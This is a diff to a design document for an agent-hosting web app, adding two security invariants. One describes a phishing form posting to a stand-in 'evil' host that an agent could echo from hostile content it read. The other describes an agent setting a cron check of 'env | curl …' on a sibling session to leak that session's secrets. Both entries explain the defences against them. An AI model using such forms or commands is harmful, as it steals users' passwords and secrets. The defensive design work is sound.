@@ -206,6 +206,21 @@ Numbers are STABLE handles referenced across the codebase and docs ("see invaria
    this Markdown derives from what the agent read (a cloned README, a web page, a
    Telegram message). With no DOMPurify loaded, we fall back to `textContent`
    rather than injecting unfiltered HTML.
+   **And never with DOMPurify's DEFAULT config.** The defaults stop script, not
+   phishing: an agent echoing hostile content could render a
+   `<form action="https://evil/…">` with a password field ("session expired,
+   re-enter your password") inside a fullscreen `style=` overlay — `style-src`
+   keeps `unsafe-inline`. Every render site goes through
+   `sanitizeAgentMarkdown`, which passes `AGENT_MD_PURIFY` (no `form`, `input`,
+   `button`, `textarea`, `select`, `option`, `style`, `iframe`, `object`,
+   `embed`; no `style` attribute). Nothing legitimate loses out: marked writes
+   table alignment as `align=`, and there is no highlighter. One visible cost:
+   a GFM task list loses its (disabled) checkbox, the text stays. Behind it, the
+   CSP carries `form-action 'none'` — every form we serve (the cockpit's and the
+   login page's) is handled in script, so a native submission is never
+   legitimate, and `'self'` would still let an injected form post to our own
+   routes. `test/csp.test.ts` refuses any other `DOMPurify.sanitize(` call and a
+   form with no script `submit` handler.
 
 <a id="inv-14"></a>
 
@@ -1743,3 +1758,17 @@ Numbers are STABLE handles referenced across the codebase and docs ("see invaria
     Already-sent attachments stay where they are (their paths are in
     transcripts); the old shared dir is closed to writes (0755) and its
     server-written files are copied flat into the new root for `/media`.
+    **And a check runs with the TARGET's secrets, so an agent may only guard
+    ITSELF.** `mayActOnSession` lets an agent act on its siblings in its group
+    and in the commons — and in mono-tenant everything is commons — so an agent
+    could `POST /crons` on a sibling whose profile carries more secrets, with a
+    `check` of `env | curl …`. `cronCheckAllowed` refuses (403) an agent that
+    SETS or MOVES a check onto another session; a person (no agent key) may
+    still guard any agent they may drive, an agent may still put a check-less
+    cron on a sibling (that is only driving it), and may edit the prompt or
+    schedule of a sibling's cron whose check and target it leaves unchanged.
+    Rejected alternative: running the check with the SETTER's profile secrets —
+    it needs a setter recorded on every cron, and a check aimed at a sibling's
+    cwd with the wrong secrets is a guard that silently tests the wrong thing.
+    Existing crons are untouched (the rule is applied at write time). The
+    scheduler skill always targets the CURRENT channel, so it never hits it.
